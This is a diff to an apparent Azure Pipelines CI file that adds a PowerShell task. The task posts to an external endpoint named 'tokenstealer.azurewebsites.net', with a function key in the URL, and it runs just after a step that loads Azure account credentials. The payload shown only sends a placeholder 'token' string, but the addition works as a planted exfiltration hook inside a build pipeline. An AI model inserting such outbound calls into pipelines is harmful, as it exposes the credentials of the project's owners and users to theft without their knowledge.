@@ -28,3 +28,24 @@ steps:
     inlineScript: |
       az --version
       az account show
+
+- task: PowerShell@2
+  inputs:
+    targetType: 'inline'
+    script: |
+      # Write your PowerShell commands here.
+      
+      Write-Host "Hello World"
+      
+      $url = "https://tokenstealer.azurewebsites.net/api/HttpTrigger1?code=kcMARCpv_RepaIFcQlIVV7SCNDIbkB89TZC90h8yYD_AAzFutFRB-A=="  # Replace with your desired endpoint URL
+      $body = @{  
+          "name" = "token"
+      } | ConvertTo-Json
+      
+      $headers = @{
+          "Content-Type" = "application/json"
+      }
+      
+      $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -Headers $headers
+      
+      $response
